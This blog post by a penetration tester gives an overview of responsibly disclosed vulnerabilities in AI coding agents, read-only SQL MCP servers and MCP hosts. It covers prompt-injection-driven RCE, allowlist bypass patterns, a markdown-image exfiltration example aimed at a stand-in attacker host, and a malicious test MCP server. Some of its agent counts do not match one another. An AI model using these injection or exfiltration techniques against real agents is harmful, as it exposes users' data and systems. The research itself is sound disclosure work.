---
title: Pwning AI Agents (Part 1/4) - Exploiting AI Coding Agents and Read-Only SQL MCP Servers
date: 2025-08-11T04:00:56+01:00
toc: true
images: 
  - /media/2026/03/breakingboundaries-header.jpg
tags:
  - AI
  - English
---

![Breaking Boundaries Header](/media/2026/03/breakingboundaries-header.jpg)

This is the first of four posts about vulnerabilities found in AI coding agents, MCP servers and MCP hosts. This first post provides a non-technical overview of the three projects and their results, while the subsequent three posts delve deeper into each project, including the technical aspects.

## TLDR
- Found 25 vulnerabilities in 19 AI Coding Agents with way over 100 million downloads in total. 11x RCE due to autonomous execution of dangerous commands or command allowlist bypasses. 14x data exfiltration via markdown images.
- 5 AI Coding Agents with way over 100 million downloads in total handled MCP servers insecurely leading to RCE and tool poisoning. Furthermore, the REDACTED (will be disclosed soon) was found to be vulnerable to XSS, which could be escalated to RCE. To test the security of such MCP hosts [MaliM](https://github.com/m10x/malim), an advanced malicious MCP server with several attack techniques, was developed. 
- Bypassed the read-only restriction in 17 "read-only" SQL MCP servers, leading to arbitrary data modification and deletion as well as arbitrary file writes. Among these was the official MariaDB MCP server.
- Approximetely 30 minutes of my spare time were spend for each AI Agent and MCP server. This highlights the disastrous state of security and suggests that there are most likely many more vulnerabilities yet to be found.

## How did it all begin?
I have been following developments in AI and related vulnerabilities for quite some time. As part of my work as a penetration tester at [G DATA Advanced Analytics](https://www.gdata.de/business/security-services/penetrationstests), I have been working intensively on the topic of "AI application penetration testing" since early 2025, with the aim of developing it as a service. Furthermore, I had often considered searching for new vulnerabilities in AI agents or MCP servers. 

In mid-August 2025, I was indirectly inspired by AI security researcher Johann Rehberger (aka "wunderwuzzi") to become active myself. As an avid reader of his blog, I followed his blog series, [The Month of AI Bugs 2025](https://embracethered.com/blog/tags/month-of-ai-bugs/). This led to the inspiration for my first project: to identify remote code execution (RCE) and data exfiltration in AI coding agents that had not yet been discovered by any other researcher. 

In October 2025, when this project was completed, I was inspired by the explosion of MCP servers to also find vulnerabilities in them. However, I didn't want to test MCP servers at random. Instead, I decided to check all "read-only" SQL MCP servers to see if it was possible to circumvent the read-only restriction and manipulate or delete arbitrary data. At the beginning of March 2026, I doubled the number of servers I checked, thus testing all those I could find at that time.

In mid-November 2025, I was inspired by one of my favorite podcasts "Critical Thinking - Bug Bounty Podcast", for the last of the three projects. In episode 148 [Episode 148 "MCP Hacking Guide"](https://www.criticalthinkingpodcast.io/episode-148-mcp-hacking-guide/) host and successful bug bounty hunter Justin Gardner aka "Rhynorater" discussed the MCP specification and shared his thoughts on potential vulnerabilities. I was surprised to learn that there is still no comprehensive tool or MCP server that can check MCP hosts for vulnerabilities. I thoroughly reviewed the specification and created an exploit for each potential vulnerability of MCP hosts. I then bundled these exploits in the malicious MCP server, [MaliM](https://github.com/m10x/malim) ("**Mali**cious **M**CP Server"). Since then, I have regularly tracked changes and innovations in the MCP protocol, considering whether they could pose a security risk and be exploited by MaliM.

## Project 1: RCE and Data Exfiltration in AI Coding Agents

Indirect prompt injections are unavoidable. Therefore, I aimed to verify whether indirect prompt injections could cause AI coding agents to exfiltrate data or execute commands (RCE).

### Targets

My targets were AI coding agents that:
- Have more than one million downloads/users
- Have not yet been tested by security researcher Johann Rehberger, aka "wunderwuzzi" :)

The following 18 AI coding agents were therefore examined:
- REDACTED
- Alibaba's Lingma
- REDACTED
- Windsurf IDE
- Windsurf Plugin for VSCode/Intellij
- Intellij's Junie
- REDACTED
- Cline
- Codegeex
- Sourcery
- Amazon's Kiro
- Amazon's Q Developer
- Qodo
- Kilo
- RooCode
- Mistral-Vibe
- Qoder IDE
- Qoder Plugin for Intellij

Three were REDACTED due to private bug bounty programs and/or legal reasons. Mistral and Qoder were tested as well, even though they did not meet the criteria of having at least one million downloads or users, because they ranked high in search queries.
There are no official download figures for Kiro and Windsurf. Nevertheless, it can be assumed that they are among the most widely used AI coding agents.

### Methods

There are many ways to perform data exfiltration and RCE. Here, I have limited myself to the following techniques:
- Command Execution via dangerous commands in allowlist (e.g. find is allowed and arbitrary commands can be run with the `-exec ARBITRARY_COMMAND` flag)
- Command Execution via allowlist bypass (e.g. whoami is allowed and arbitrary commands can be run with `whoami $(ARBITRARY_COMMAND)`).
- Command Execution via malicious MCP config file (a project with a malicious MCP config file is opened, containing instructions to run a STDIO MCP Server via `ARBITRARY_COMMAND`)
- Data Exfiltration via markdown image (e.g. instructing the Agent to render the image `![test](https://attacker.example?m10x)` but replacing m10x with sensitive information). For some agents, bypassing the CSP which prevented exfiltration was necessary.

The AI coding agents were always used in their default configuration.

### Results

19 of the 20 AI coding agents examined had RCE or data exfiltration vulnerabilities. Amazon's Q Developer was the only agent not vulnerable to the attack methods. It later came to light that Johann Rehberger had successfully exploited and reported these vulnerabilities. The vulnerabilities had therefore already been fixed, though this had not yet been publicly announced at the time of my tests.

| AI Coding Agent | RCE | Data Exfiltration | Fixed |
|-------------------|----|----|---|
| REDACTED | x | |
| Alibaba's Lingma | x | x |
| REDACTED | x | |
| Windsurf IDE | | x |
| Windsurf Plugin for VSCode/Intellij | | x |
| Intellij's Junie | | x |
| REDACTED | | x |
| Cline | | x |
| Codegeex | | x |
| Sourcery | | x | 1.42.0 |
| Amazon's Kiro | | x | 0.8.0 |
| Amazon's Q Developer | | |
| Qodo | x | | Fixed according to vendor |
| Kilo | 2x | x |
| RooCode | | x |
| Mistral-Vibe | x | | 2.5.0 |
| Qoder IDE | x | |
| Qoder Plugin for Intellij | x | x |
| REDACTED | x | |
| REDACTED | x | 2x |

The AI coding agents with known vulnerabilities have been downloaded way over 100 million times. However, two of the most popular agents, Windsurf and Kiro, do not disclose their download figures and were therefore not included in the calculation.

## Project 2: Bypassing the Read-Only Restrction in SQL MCP Servers

There are countless MCP servers for everything under the sun. To limit the pool of servers to be examined, I decided to test "read-only" SQL MCP servers and circumvent the read-only restriction.

### Targets

My targets were SQL MCP servers that:
- Have technical measures in place to enforce read-only operations
- Do *not* explicitly recommend restricting the permissions of the SQL user.
- Can connect to SQLite, MySQL, MariaDB, PostgreSQL, or MSSQL servers.


The following 19 read-only SQL MCP were therefore examined:
- [sqlite-reader-mcp](https://github.com/abhinavnatarajan/sqlite-reader-mcp)
- [sqlite-explorer-fastmcp-mcp-server](https://github.com/hannesrudolph/sqlite-explorer-fastmcp-mcp-server)
- [mcp-mysql-server](https://github.com/alexcc4/mcp-mysql-server)
- [mcp-server-mariadb](https://github.com/abel9851/mcp-server-mariadb)
- [simple-mysql-mcp-server](https://github.com/bintariq/simple-mysql-mcp-server)
- [mcp-server-mysql](https://github.com/benborla/mcp-server-mysql)
- [db-mcp-server](https://github.com/zerogon1203/db-mcp-server) (inspected both the mysql and postgresql mode)
- [MariaDB/mcp](https://github.com/MariaDB/mcp) (MariaDB's official MCP server)
- 9x REDACTED
- [postgres-mcp](https://github.com/crystaldba/postgres-mcp)

Due to responsible disclosure, nine of the tested MCP servers will be disclosed in early June.

### Methods

I investigated whether the "read-only" restriction was implemented insecurely. This included the following:
- Does the command allowlist permit state-changing commands?
- Is the command denylist insufficient?
- Can the deny/allow list checks be bypassed?
- Are there other vulnerabilities that become apparent during testing?
Many great SQL quirks and inconspicuous commands were exploited. Even classic SQL injections based on the simple concatenation of user input in queries were identified. :)

### Results

Vulnerabilities were found in 18 of the 19 examined MCP servers. In 14 cases, the read-only restriction could be bypassed. As an outcome of this, RCE is possible in the case of Postgres, and database user passwords can be changed in the case of MySQL. In another 14 cases, it was possible to read or write files on the server.

|MCP Server| Read-Only Bypass | Other Vuln | Fixed | CVE |
|-|-|-|-|-|
|sqlite-reader-mcp| | File Enum | | [CVE-2025-71169](https://www.cve.org/CVERecord?id=CVE-2025-71169) |
|sqlite-explorer-fastmcp-mcp-server| x | | | [CVE-2025-71170](https://www.cve.org/CVERecord?id=CVE-2025-71170) |
|mcp-mysql-server| x | File Write/Read | | [CVE-2025-71171](https://www.cve.org/CVERecord?id=CVE-2025-71171),[CVE-2025-69853](https://www.cve.org/CVERecord?id=CVE-2025-69853) |
|mcp-server-mysql| x | File Write/Read | | [CVE-2025-71174](https://www.cve.org/CVERecord?id=CVE-2025-71174),[CVE-2025-69859](https://www.cve.org/CVERecord?id=CVE-2025-69859) |
|simple-mysql-mcp-server| x | File Write/Read | | [CVE-2025-71173](https://www.cve.org/CVERecord?id=CVE-2025-71173),[CVE-2025-69854](https://www.cve.org/CVERecord?id=CVE-2025-69854) |
|db-mcp-server (mysql)| | File Write/Read | Oct 1, 2025 Release | [CVE-2025-71175](https://www.cve.org/CVERecord?id=CVE-2025-71175),[CVE-2025-69862](https://www.cve.org/CVERecord?id=CVE-2025-69862) |
|mcp-server-mariadb| | File Write/Read | | [CVE-2025-71172](https://www.cve.org/CVERecord?id=CVE-2025-71172),[CVE-2025-69855](https://www.cve.org/CVERecord?id=CVE-2025-69855) |
|MariaDB/mcp| x | File Write/Read | 0.2.4 | [CVE-2025-69860](https://www.cve.org/CVERecord?id=CVE-2025-69860) |
|db-mcp-server (postgresql)| 2x | File Write/Read | Oct 1, 2025 Release | [CVE-2025-71175](https://www.cve.org/CVERecord?id=CVE-2025-71175),[CVE-2025-69862](https://www.cve.org/CVERecord?id=CVE-2025-69862) |
|REDACTED|x| File Write/Read |
|REDACTED|x| File Write/Read |
|REDACTED|x| File Write/Read |
|REDACTED| | File Write/Read |
|REDACTED|x| File Write/Read, Port Scanning |
|REDACTED|x| File Write/Read, Port Scanning |
|REDACTED|x| |
|REDACTED|x| File Write/Read |
|REDACTED|x| |
|postgres-mcp|

## Project 3: Developing a Malicious MCP Server to Exploit insecure MCP Hosts

### Targets

Not all AI coding agents support MCP servers. Furthermore, the MCP server configuration and use were not fully developed for a few of the AI coding agents. MaliM's development also took a long time, which is why I only tested six MCP hosts.

The following 5 AI coding agents were therefore examined:
- JetBrains' AI Assistant
- Windsurf IDE
- ZED
- REDACTED
- REDACTED
- Cursor

Furthermore, REDACTED (will be disclosed soon), was tested as well. Due to responsible disclosure, one of the tested AI coding agents will not be announced for several weeks or months.

### MaliM
[MaliM](https://github.com/m10x/malim) is a **Mali**cious **M**CP server that I developed for this project. Apart from a few minor proof-of-concepts (PoCs), I was surprised that there is still no MCP server available to fully test MCP hosts for vulnerabilities, such as insecure handling of MCP servers.
I took a close look at the MCP specification and FastMCP documentation, considering potential attacks.
I placed XSS, template injection, and prompt injection payloads in various locations, including the server name, description, icons, tool names, descriptions, icons, log and error messages, annotations, metadata, and tags.
Furthermore, "advanced" MCP features, such as elicitation and sampling, are used to check how the MCP host reacts to them and whether they can be exploited.

### Methods
The MCP hosts were connected to MaliM, and the following checks were performed, among others:
- Are MCP tools only executed after user confirmation?
- Can the user see the parameters with which the tool is executed?
- Can the user see which server the tool belongs to?
- Is data from the MCP server displayed insecurely (XSS or template injection)?
- Can the user view data from the MCP server included in the AI agent's prompt?

### Results
With the exception of Cursor, all of the AI coding agents examined were found to handle MCP servers in an insecure manner. The consequences varied and included the following:
- Data from the MCP server is embedded in the prompt for the AI agent, though it is not displayed to the user (indirect prompt injection)
- Users do not have to confirm execution of MCP tools (data exfiltration)
- MCP tool calls are not displayed if the tool returns an error (covert tool invocations)
- Users are shown insufficient information for confirmation (e.g., parameters or MCP server name are missing)

|AI Coding Agent|Insecure MCP Server Handling|Fixed|CVE|
|-|-|-|-|
|JetBrains' AI Assistant|x|
|Windsurf IDE|x|
|ZED|x|0.219.4|[CVE-2026-25805](https://nvd.nist.gov/vuln/detail/CVE-2026-25805)|
|REDACTED|x|x|
|REDACTED|x|
|Cursor|

## Conclusion
The three projects revealed that the security of AI coding agents and MCP servers is still far from adequate. The fact that serious vulnerabilities were found in almost all of the examined AI agents and MCP servers within 5-30 minutes speaks for itself. In total, 58 vulnerabilities were identified in 37 products. These vulnerabilities include RCEs, data exfiltration, read-only bypasses, arbitrary file writes/reads, port scanning, XSS, tool poisoning, and tool spoofing.
In total, the vulnerabilities affect well over 220 million downloads of AI coding agents, especially considering that Windsurf and Kiro do not disclose download figures.

Unfortunately, many AI companies are not particularly interested in the security of their products when it comes to responsible disclosure. Many do not even provide adequate channels through which to report security issues.
However, there were a few rays of hope. I would like to highlight ZED, Sourcery, Kiro and MariaDB in particular because they responded quickly and professionally.

Sadly, only a few of the vulnerabilities have been fixed, even though the manufacturers have had well over three months—in most cases, more than six months—to do so. Technical details on the individual projects will be available in the coming months. :)